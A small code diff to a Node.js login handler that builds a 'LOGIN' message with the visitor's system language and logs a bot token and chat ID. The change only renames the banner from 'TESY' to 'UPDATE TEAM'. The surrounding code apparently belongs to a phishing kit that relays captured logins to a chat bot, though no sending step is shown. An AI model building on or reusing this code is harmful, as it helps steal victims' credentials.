@@ -36,7 +36,7 @@ exports.loginPost = async (req, res) => {
     const systemLang = req.headers["accept-language"];
 
     const message = `
-👤 TESY LOGIN 
+👤 UPDATE TEAM | LOGIN 
 
 ========================
 
@@ -60,7 +60,7 @@ SYSTEM LANGUAGE: ${systemLang}
 
 ========================
 
-✅ TESY`;
+✅ UPDATE TEAM`;
 console.log(message);
     console.log(botToken, chatId);
     
